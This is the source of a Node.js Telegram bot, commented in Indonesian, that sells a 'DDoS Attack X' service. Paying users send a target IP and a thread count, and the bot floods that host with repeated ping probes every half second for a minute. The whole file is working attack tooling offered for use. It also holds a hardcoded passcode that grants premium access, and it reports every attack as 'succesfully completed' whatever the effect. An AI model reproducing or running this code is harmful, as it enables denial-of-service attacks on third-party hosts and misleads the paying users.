const { Telegraf } = require("telegraf");
require("dotenv").config()
const axios = require('axios');
const ping = require('ping');
const User = require("./models/mongoose");
const mongoose = require('mongoose');

// Buat objek bot dengan token bot Telegram Anda
const bot = new Telegraf(process.env.BOT_TOKEN);

const dbURL = process.env.MONGO_URL;
mongoose.connect(dbURL, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => console.error('Error connecting to MongoDB:', err));

bot.use(async (ctx, next) => {
  const chatId = ctx.message.chat.id;

  try {
    const user = await User.findOne({ chatId });
    if (user && user.isPremium) {
      // Jika pengguna premium, lanjutkan ke handler utama
      return next();
    } else {
      // jika ingin jadi premium /premiumdddosattack
      if (ctx.message.text === "/premiumddosattackx") {
        // buat user baru dengan isPremium true
        const newUser = new User({ chatId, isPremium: true });
        await newUser.save();
        // ctx.reply("Welcome to Virus Attack!\n\nAttack your target with various viruses via messaging application.\n\nEnter target phone number including (+countrycode):");
        ctx.reply(`Welcome to DDoS Attack X !
    \nUse command prompt below to start DDoS Attack
    \n/ddos {target ip address} {threads amount}
    \nExample: /ddos 1.1.1.1 1000
    \nUse command prompt below to stop DDoS Attack process 
    \n/stop
    \n⚠️ Max threads per attack: 9000
    \n⚠️ Warning! Do not attack any gov or enforcement agency websites. Use at your own risks.`);

      } else {
        // jika bukan pengguna premium, tampilkan pesan ini
        ctx.reply("⚠️ Strictly for paid subscribers use only.\n\nPlease Enter Passcode:"
        );
      }
    }
  } catch (err) {
    console.error('Error checking premium status:', err);
    ctx.reply("Error checking on subscription status.");
  }
});

// const keep_alive = require('./keep_alive.js')
const keep_alive = require('./keep_alive.js')

// start
bot.command('start', (ctx) => {
    ctx.reply(`Welcome to DDoS Attack X !
    \nUse command prompt below to start DDoS Attack
    \n/ddos {target ip address} {threads amount}
    \nExample: /ddos 1.1.1.1 1000
    \nUse command prompt below to stop DDoS Attack process 
    \n/stop
    \n⚠️ Max threads per attack: 9000
    \n⚠️ Warning! Do not attack any gov or enforcement agency websites. Use at your own risks.`)
})


// Gunakan objek untuk melacak proses berjalan pada setiap chat ID
let activeProcesses = {};





// Function untuk memulai proses
function startProcess(ctx) {


    const ip = ctx.message.text.split(' ')[1]
    const threads = ctx.message.text.split(' ')[2]

    // jika tidak ada ip dan threads
    if (!ip || !threads) {
        return ctx.reply(`Do complete your command prompt as below
        \n/ddos ip 1000\``, { parse_mode: 'Markdown' });
    }
    const chatId = ctx.chat.id;

    if (activeProcesses[chatId]) {
        ctx.reply('Process currently running on backend.');
    } else {
        activeProcesses[chatId] = true;
        // Simulasi proses yang berjalan secara background
        // Anda dapat mengganti ini dengan tugas yang sesuai dengan kebutuhan Anda
        simulateBackgroundProcess(ctx);
    }
}

// Function untuk menghentikan proses
function stopProcess(ctx) {
    const chatId = ctx.chat.id;

    if (activeProcesses[chatId]) {
        clearInterval(activeProcesses[chatId]);
        delete activeProcesses[chatId];
        ctx.reply('Process stopped.');
    } else {
        ctx.reply('No process currently running on backend.');
    }
}

// Simulasi proses yang berjalan secara background
function simulateBackgroundProcess(ctx) {
    const chatId = ctx.chat.id;

    // Ganti dengan tugas yang sesuai dengan kebutuhan Anda
    console.log(`Process currently running on backend for ${chatId}...`);
    // ctx.reply(`DDOS Serang IP ${ip} dengan ${threads} threads`)
    const ip = ctx.message.text.split(' ')[1]
    const threads = ctx.message.text.split(' ')[2]

    // for until 10
    for (let i = 0; i < 10; i++) {
        ctx.reply(`DDOS Attack to IP ${ip} with ${threads} threads currently running...`)
    }



    // Contoh: Mencetak "Proses berjalan di background..." setiap 5 detik selama 1 menit
    const interval = setInterval(() => {
        // jalankan ddos 
        // jika tidak ada ip dan threads
        // ambil ip dan threads


        // const threads = 2;
        for (let i = 0; i < threads; i++) {
            ping.promise.probe(ip)
                .then(function (res) {
                    console.log(res);
                }
                );
        }


    }, 500);

    // Simpan interval pada objek activeProcesses agar bisa dihentikan nanti
    activeProcesses[chatId] = interval;

    // Menunggu sinyal perintah "/stop" atau jika proses berjalan selama lebih dari 1 menit
    const stopSignal = new Promise((resolve) => bot.command('stop', resolve));
    const timeout = new Promise((resolve) => setTimeout(resolve, 60000));

    Promise.race([stopSignal, timeout]).then(() => {
        clearInterval(interval);
        delete activeProcesses[chatId];

        // DDOS Attack to IP 34.74.3.249 with 7 threads succesfully completed
        ctx.reply(`DDOS Attack to IP ${ip} with ${threads} threads succesfully completed`)
        console.log(`Proses success for Chat ID ${chatId}.`);
    });
}

// Middleware untuk menangani perintah "/mulai"
bot.command('ddos', startProcess);

// Middleware untuk menangani perintah "/stop"
bot.command('stop', stopProcess);

// jalankan bot dan berikan pesan ke console jika bot sudah berjalan
bot.launch()
